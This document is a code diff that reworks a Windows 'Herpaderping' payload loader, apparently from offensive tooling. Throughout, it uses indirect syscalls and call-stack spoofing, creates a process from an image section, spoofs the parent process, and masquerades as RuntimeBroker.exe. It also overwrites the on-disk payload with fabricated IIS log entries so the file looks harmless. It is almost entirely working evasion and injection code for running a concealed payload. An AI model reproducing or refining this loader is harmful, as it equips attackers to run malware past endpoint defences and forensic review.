@@ -376,31 +376,39 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 		exit(-1);
 	}
 	DBG_PRINT("Herpaderping: indirect syscall pool initialized");
-	INDIRECT_SYSCALL(_NtCreateUserProcess, pNtCreateUserProcess, NtCreateUserProcess);
+
+	// Indirect syscalls — the 5 injection-critical NT APIs in classic herpaderping path
+	INDIRECT_SYSCALL(_NtCreateSection,          pNtCreateSection,          NtCreateSection);
+	INDIRECT_SYSCALL(_NtCreateProcessEx,        pNtCreateProcessEx,        NtCreateProcessEx);
+	INDIRECT_SYSCALL(_NtAllocateVirtualMemory,  pNtAllocateVirtualMemory,  NtAllocateVirtualMemory);
+	INDIRECT_SYSCALL(_NtWriteVirtualMemory,     pNtWriteVirtualMemory,     NtWriteVirtualMemory);
+	INDIRECT_SYSCALL(_NtCreateThreadEx,         pNtCreateThreadEx,         NtCreateThreadEx);
 	SealSyscallPool();
 
-	if (pNtCreateUserProcess == NULL)
+	if (!pNtCreateSection || !pNtCreateProcessEx || !pNtAllocateVirtualMemory ||
+		!pNtWriteVirtualMemory || !pNtCreateThreadEx)
 	{
-		perror("[-] Couldn't resolve SSN for NtCreateUserProcess\n");
+		perror("[-] Couldn't resolve SSN for one or more Nt* APIs\n");
 		exit(-1);
 	}
 
-	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
-	if (pRtlCreateProcessParametersEx == NULL)
+	// Non-syscall helpers (Rtl* / read-only Nt*) — resolved via API hash
+	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx =
+		(_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
+	_RtlInitUnicodeString pRtlInitUnicodeString =
+		(_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
+	_NtQueryInformationProcess pNtQueryInformationProcess =
+		(_NtQueryInformationProcess)RESOLVE_API(hNtdll, NtQueryInformationProcess);
+	if (!pRtlCreateProcessParametersEx || !pRtlInitUnicodeString || !pNtQueryInformationProcess)
 	{
-		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
-		exit(-1);
-	}
-	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
-	if (pRtlInitUnicodeString == NULL)
-	{
-		perror("[-] Couldn't find API RtlInitUnicodeString\n");
+		perror("[-] Failed to resolve Rtl/Nt helper APIs\n");
 		exit(-1);
 	}
 
-	HANDLE hTemp;
+	HANDLE hTemp = INVALID_HANDLE_VALUE;
+	HANDLE hSection = NULL;
 	HANDLE hProcess = NULL;
-	HANDLE hThread = NULL;
+	HANDLE hThread  = NULL;
 	NTSTATUS status;
 	DWORD bytesWritten;
 
@@ -410,8 +418,8 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	GetTempPathW(MAX_PATH, tempPath);
 	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
 
-	// Open with FILE_SHARE_READ so NtCreateUserProcess can read for section creation.
-	// Keep handle open — do NOT close yet. We reuse it for overwrite after section is created.
+	// Keep handle open across NtCreateSection — pre-held GENERIC_WRITE survives
+	// MmFlushImageSection (the kernel only blocks NEW writers, not existing handles).
 	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
 						FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
 	if (hTemp == INVALID_HANDLE_VALUE)
@@ -425,14 +433,91 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 		exit(-1);
 	}
 	FlushFileBuffers(hTemp);
-	// hTemp intentionally left open — closed after overwrite below
 	DBG_PRINT("Herpaderping: temp file created and payload written: %ls (%lu bytes)", tempFile, bytesWritten);
 
-	// Build NT path for NtCreateUserProcess
-	wchar_t ntImagePath[MAX_PATH + 8] = {0};
-	wsprintfW(ntImagePath, L"\\??\\%s", tempFile);
+	// 1) Create SEC_IMAGE section from the temp file (payload still on disk)
+	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0,
+							  PAGE_READONLY, SEC_IMAGE, hTemp);
+	if (!NT_SUCCESS(status))
+	{
+		DBG_PRINT("Herpaderping: NtCreateSection failed (0x%08lx)", status);
+		exit(-1);
+	}
+	DBG_PRINT("Herpaderping: section created from temp file (hSection=%p)", hSection);
 
-	// Process parameters — masquerade as RuntimeBroker.exe
+	// 2) Create ghost process from the section.
+	//    PPID via ParentProcess HANDLE (same kernel path as PS_ATTRIBUTE_PARENT_PROCESS).
+	//    Flags=0 → no PS_INHERIT_HANDLES (avoid handle leak).
+	//    InJob=FALSE → do not join the parent's job object.
+	//    NtCreateProcessEx does NOT create a primary thread — naturally writable window.
+	HANDLE hParent = GetNonJobParent();
+	{
+		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
+		spoofer.Activate();
+		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
+									0,
+									hSection,
+									NULL, NULL,
+									FALSE);
+		spoofer.Deactivate();
+	}
+	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
+	if (!NT_SUCCESS(status))
+	{
+		DBG_PRINT("Herpaderping: NtCreateProcessEx failed (0x%08lx)", status);
+		exit(-1);
+	}
+	DBG_PRINT("Herpaderping: NtCreateProcessEx OK (hProcess=%p, no primary thread)", hProcess);
+
+	// 3) Overwrite the ENTIRE file in-place with decoy content.
+	//    SetEndOfFile cannot shrink the file while an image section is active
+	//    (it would fail silently here), so we keep the original file length and
+	//    just overwrite every byte by looping the decoy lines until we've covered
+	//    the full payloadSize. Result on disk: 3.2 MB of IIS-style log entries
+	//    instead of payload + log header.
+	SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
+	const char* decoyLines[] = {
+		"#Software: Microsoft Internet Information Services 10.0\r\n",
+		"#Version: 1.0\r\n",
+		"#Date: 2026-05-28 00:00:00\r\n",
+		"#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\r\n",
+		"2026-05-28 08:14:02 10.0.0.5 GET /api/health - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 15\r\n",
+		"2026-05-28 08:14:03 10.0.0.5 POST /api/upload/status - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 47\r\n",
+		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/main.css - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 3\r\n",
+		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/app.js - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 5\r\n",
+		"2026-05-28 08:14:07 10.0.0.5 GET /favicon.ico - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 404 0 2 1\r\n",
+		"2026-05-28 08:14:12 10.0.0.5 POST /api/upload/chunk - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 203\r\n",
+	};
+	const int decoyCount = _countof(decoyLines);
+	SIZE_T totalWritten = 0;
+	int idx = 0;
+	while (totalWritten < payloadSize)
+	{
+		const char* line = decoyLines[idx % decoyCount];
+		DWORD len = (DWORD)strlen(line);
+		if (totalWritten + len > payloadSize) len = (DWORD)(payloadSize - totalWritten);
+		DWORD wrote = 0;
+		if (!WriteFile(hTemp, line, len, &wrote, NULL) || wrote == 0) break;
+		totalWritten += wrote;
+		idx++;
+	}
+	FlushFileBuffers(hTemp);
+	CloseHandle(hTemp);
+	hTemp = INVALID_HANDLE_VALUE;
+	DBG_PRINT("Herpaderping: temp file overwritten with decoy (%zu / %zu bytes)", totalWritten, payloadSize);
+
+	// 4) Query PEB and resolve entry point from the payload image headers
+	PROCESS_BASIC_INFORMATION pbi = {0};
+	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
+	if (!NT_SUCCESS(status))
+	{
+		DBG_PRINT("Herpaderping: NtQueryInformationProcess failed (0x%08lx)", status);
+		exit(-1);
+	}
+	ULONG_PTR entryPoint = GetEntryPoint(hProcess, payload, pbi);
+	DBG_PRINT("Herpaderping: entry point resolved at %p", (PVOID)entryPoint);
+
+	// 5) Build process parameters — masquerade as RuntimeBroker.exe
 	UNICODE_STRING uTargetFilePath;
 	wchar_t targetFilePath[MAX_PATH] = {0};
 	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
@@ -452,121 +537,75 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 		DBG_PRINT("Herpaderping: RtlCreateProcessParametersEx failed (0x%08lx)", status);
 		exit(-1);
 	}
-	DBG_PRINT("Herpaderping: process parameters created OK");
+	DBG_PRINT("Herpaderping: process parameters created OK (local=%p)", processParameters);
 
-	// PS_CREATE_INFO
-	PS_CREATE_INFO createInfo;
-	memset(&createInfo, 0, sizeof(createInfo));
-	createInfo.Size = sizeof(createInfo);
-	createInfo.State = PsCreateInitialState;
-
-	// B3 — PPID Spoofing: find svchost.exe/wininit.exe in Session 0
-	HANDLE hParent = GetNonJobParent();
-
-	// PS_ATTRIBUTE_LIST — image name + parent process (PPID spoof)
-	UNICODE_STRING uNtImagePath;
-	pRtlInitUnicodeString(&uNtImagePath, ntImagePath);
-
-	PS_ATTRIBUTE_LIST attrList;
-	memset(&attrList, 0, sizeof(attrList));
-	attrList.TotalLength = sizeof(SIZE_T) + 2 * sizeof(PS_ATTRIBUTE);
-	attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
-	attrList.Attributes[0].Size = uNtImagePath.Length;
-	attrList.Attributes[0].ValuePtr = uNtImagePath.pBuffer;
-	attrList.Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
-	attrList.Attributes[1].Size = sizeof(HANDLE);
-	attrList.Attributes[1].Value = (ULONG_PTR)hParent;
-
-	// NtCreateUserProcess — process + initial thread created atomically
-	// Thread suspended so we can overwrite the file before execution starts
-	{
-		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
-		spoofer.Activate();
-		status = pNtCreateUserProcess(&hProcess, &hThread,
-									  PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
-									  NULL, NULL,
-									  0,
-									  THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
-									  processParameters,
-									  &createInfo,
-									  &attrList);
-		spoofer.Deactivate();
-	}
-	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
+	// 6) Allocate remote memory covering the same VA range as local processParameters.
+	//    The UNICODE_STRING.pBuffer fields inside the normalized params block hold
+	//    absolute pointers into the local address range — they only resolve in the
+	//    remote process if the block lands at the same VA.
+	//    NtAllocateVirtualMemory rounds the hint DOWN to 64KB allocation granularity
+	//    and the size UP to page granularity, so we pre-align: hint = local & ~0xFFFF
+	//    and size = enough to cover from the rounded hint past the end of the original
+	//    block. This guarantees the local processParameters address falls inside the
+	//    remote allocation.
+	const SIZE_T ALLOC_GRANULE = 0x10000;
+	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
+	ULONG_PTR hintBase  = (ULONG_PTR)processParameters & ~(ALLOC_GRANULE - 1);
+	ULONG_PTR hintEnd   = (ULONG_PTR)processParameters + paramSize;
+	SIZE_T    allocSize = (hintEnd - hintBase + ALLOC_GRANULE - 1) & ~(ALLOC_GRANULE - 1);
+	PVOID paramBuffer   = (PVOID)hintBase;
+	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &allocSize,
+									  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!NT_SUCCESS(status))
 	{
-		DBG_PRINT("Herpaderping: NtCreateUserProcess failed (0x%08lx)", status);
+		DBG_PRINT("Herpaderping: NtAllocateVirtualMemory(params) failed (0x%08lx)", status);
 		exit(-1);
 	}
-	DBG_PRINT("Herpaderping: NtCreateUserProcess OK (hProcess=%p, hThread=%p, createInfo.State=%d)", hProcess, hThread, createInfo.State);
-
-	// Overwrite temp file with decoy content using pre-held handle.
-	// We kept hTemp open since file creation so the image section (created inside
-	// NtCreateUserProcess) cannot block our write — the section only needs READ
-	// on the file object; our existing GENERIC_WRITE handle is unaffected.
-	SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
-	SetEndOfFile(hTemp);
-	const char* decoyLines[] = {
-		"#Software: Microsoft Internet Information Services 10.0\r\n",
-		"#Version: 1.0\r\n",
-		"#Date: 2026-05-28 00:00:00\r\n",
-		"#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\r\n",
-		"2026-05-28 08:14:02 10.0.0.5 GET /api/health - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 15\r\n",
-		"2026-05-28 08:14:03 10.0.0.5 POST /api/upload/status - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 47\r\n",
-		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/main.css - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 3\r\n",
-		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/app.js - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 5\r\n",
-		"2026-05-28 08:14:07 10.0.0.5 GET /favicon.ico - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 404 0 2 1\r\n",
-		"2026-05-28 08:14:12 10.0.0.5 POST /api/upload/chunk - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 203\r\n",
-	};
-	for (int i = 0; i < _countof(decoyLines); i++)
+	if (paramBuffer != (PVOID)hintBase)
 	{
-		DWORD len = (DWORD)strlen(decoyLines[i]);
-		WriteFile(hTemp, decoyLines[i], len, &bytesWritten, NULL);
+		DBG_PRINT("Herpaderping: WARN — kernel did not honor hint (wanted=%p, got=%p); params write will likely fail",
+				  (PVOID)hintBase, paramBuffer);
 	}
-	FlushFileBuffers(hTemp);
-	CloseHandle(hTemp);
-	hTemp = INVALID_HANDLE_VALUE;
-	DBG_PRINT("Herpaderping: temp file overwritten with decoy content");
+	DBG_PRINT("Herpaderping: remote params region allocated [%p .. %p] (covers local %p)",
+			  paramBuffer, (PVOID)((ULONG_PTR)paramBuffer + allocSize), processParameters);
 
-	// Resume thread — Win32 API (no indirect syscall needed; benign call)
-	DWORD prevCount = ResumeThread(hThread);
-	if (prevCount == (DWORD)-1)
+	// 7) Copy the params blob into the remote allocation
+	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters, paramSize, NULL);
+	if (!NT_SUCCESS(status))
 	{
-		DBG_PRINT("Herpaderping: ResumeThread failed (GLE=%lu)", GetLastError());
+		DBG_PRINT("Herpaderping: NtWriteVirtualMemory(params) failed (0x%08lx)", status);
 		exit(-1);
 	}
-	DBG_PRINT("Herpaderping: ResumeThread OK (prevSuspendCount=%lu), ghost process running", prevCount);
 
-	// POSIX delete: unlinks file from directory immediately even with active image section
+	// 8) Patch PEB->ProcessParameters to point at the params block
+	PEB* remotePEB = (PEB*)pbi.PebBaseAddress;
+	PVOID paramsPtr = processParameters;
+	status = pNtWriteVirtualMemory(hProcess, &remotePEB->ProcessParameters,
+								   &paramsPtr, sizeof(PVOID), NULL);
+	if (!NT_SUCCESS(status))
 	{
-		_NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)RESOLVE_API(hNtdll, NtSetInformationFile);
-		if (pNtSetInformationFile)
-		{
-			HANDLE hDel = CreateFileW(tempFile, DELETE, FILE_SHARE_READ | FILE_SHARE_DELETE,
-									  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (hDel != INVALID_HANDLE_VALUE)
-			{
-				IO_STATUS_BLOCK iosb = {0};
-				FILE_DISPOSITION_INFORMATION_EX dispEx;
-				dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
-				NTSTATUS st = pNtSetInformationFile(hDel, &iosb, &dispEx, sizeof(dispEx), FileDispositionInformationEx);
-				CloseHandle(hDel);
-				if (NT_SUCCESS(st))
-				{
-					DBG_PRINT("Herpaderping: temp file POSIX-deleted");
-				}
-				else
-				{
-					DBG_PRINT("Herpaderping: POSIX delete failed (0x%08lx), falling back to DeleteFileW", st);
-					DeleteFileW(tempFile);
-				}
-			}
-		}
-		else
-		{
-			DeleteFileW(tempFile);
-		}
+		DBG_PRINT("Herpaderping: NtWriteVirtualMemory(PEB->ProcessParameters) failed (0x%08lx)", status);
+		exit(-1);
 	}
+	DBG_PRINT("Herpaderping: PEB->ProcessParameters patched");
+
+	// 9) Create primary thread at entry point — ghost process begins execution
+	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
+							   (LPTHREAD_START_ROUTINE)entryPoint, NULL,
+							   FALSE, 0, 0, 0, 0);
+	if (!NT_SUCCESS(status))
+	{
+		DBG_PRINT("Herpaderping: NtCreateThreadEx failed (0x%08lx)", status);
+		exit(-1);
+	}
+	DBG_PRINT("Herpaderping: NtCreateThreadEx OK (hThread=%p), ghost process running", hThread);
+
+	// Section handle no longer needed — child has its own image mapping.
+	if (hSection) { CloseHandle(hSection); hSection = NULL; }
+
+	// Note: no file delete. The active image section locks the file against
+	// unlink (even POSIX semantics — confirmed failing 0xC0000121 on this build).
+	// The full in-place decoy overwrite above makes the residual file innocuous.
 	return TRUE;
 }
 
